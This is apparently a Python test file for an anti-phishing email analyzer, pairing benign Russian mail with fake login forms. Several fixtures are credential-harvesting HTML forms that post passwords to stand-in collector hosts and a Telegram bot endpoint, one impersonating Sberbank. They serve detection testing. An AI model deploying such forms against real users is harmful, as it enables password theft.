"""Paired regressions for ordinary Russian mail and concrete credential theft."""
from email.message import EmailMessage
import pytest
from antiphish.analyzer import Analyzer

def mail(html, subject='Уведомление', sender='notifications@example.ru'):
    message=EmailMessage(); message['From']=sender; message['Subject']=subject
    message.set_content('HTML-версия сообщения')
    message.add_alternative(html,subtype='html')
    return message.as_bytes()

@pytest.mark.parametrize('body,subject',[
    ('<h1>Счёт по договору</h1><p>Оплатите счёт до пятницы. Реквизиты прежние, документы во вложении.</p>','Счёт № 125'),
    ('<h1>Ozon</h1><p>Заказ передан в доставку.</p><a href="https://www.ozon.ru/my/orderlist">Открыть заказ</a>','Ваш заказ отправлен'),
    ('<h1>СберБанк</h1><p>Чтобы подтвердить пароль, откройте официальный кабинет.</p><a href="https://online.sberbank.ru">Войти</a><a href="https://mailer.example/unsubscribe/123">Отписаться</a>','Доступ к аккаунту'),
    ('<h1>Wildberries</h1><p>Получить подарок: 500 рублей бонусами за покупки.</p><a href="https://www.wildberries.ru">Получить бонус</a><a href="https://mailer.example/unsubscribe/123">Отписаться</a>','Бонусы за покупки'),
    ('<h1>Подписка на новости</h1><form action="https://newsletter.example/subscribe"><input type=email name=email></form>','Подписка'),
    ('<h1>Просмотр PDF документа</h1><form action="https://feedback.example/send"><input type=email name=email><textarea name=comment></textarea></form>','Обратная связь'),
    ('<h1>Как распознать фишинг</h1><p>Никогда не передавайте пароль. Мошенники просят подтвердить пароль на чужом сайте.</p><a href="https://example.org/article">Пример из учебного материала</a>','Памятка по безопасности'),
    ('<h1>Госуслуги</h1><p>Вам поступило новое уведомление.</p><a href="https://www.gosuslugi.ru">Открыть уведомление</a>','Новое уведомление'),
])
def test_obvious_clean_mail(empty_kb,body,subject):
    report=Analyzer(empty_kb).analyze(mail(body,subject),name='message.eml')
    assert report.verdict.value=='NOT_DETECTED',[(e.code,e.summary) for e in report.reason_codes]

@pytest.mark.parametrize('body',[
    '<h1>Microsoft</h1><form method=post action="https://collector.example/send"><input type=password name=password></form>',
    '<h1>СберБанк</h1><form method=post action="https://not-sber.example/auth"><input type=password name=password></form>',
    '<h1>Войти в кабинет</h1><form method=post action="https://api.telegram.org/bot123456:fake_demo_token/sendMessage"><input type=password name=password></form>',
])
def test_obvious_secret_theft(empty_kb,body):
    report=Analyzer(empty_kb).analyze(body.encode(),name='login.html')
    assert report.verdict.value=='PHISHING',[(e.code,e.summary) for e in report.reason_codes]
    assert 'fake_demo_token' not in str(report.to_dict())

def test_messaging_api_notification_is_not_password_theft(empty_kb):
    report=Analyzer(empty_kb).analyze(b'<h1>Webhook integration</h1><form action="https://api.telegram.org/bot123456:demo/sendMessage"><textarea name=message></textarea></form>',name='settings.html')
    assert report.verdict.value=='NOT_DETECTED'

def test_educational_heading_cannot_hide_an_active_fake_bank_form(empty_kb):
    body='<title>Как распознать фишинг</title><h1>СберБанк</h1><p>Никогда не сообщайте пароль.</p><form action="https://collector.example/send"><input type=password></form>'
    assert Analyzer(empty_kb).analyze(body.encode(),name='login.html').verdict.value=='PHISHING'

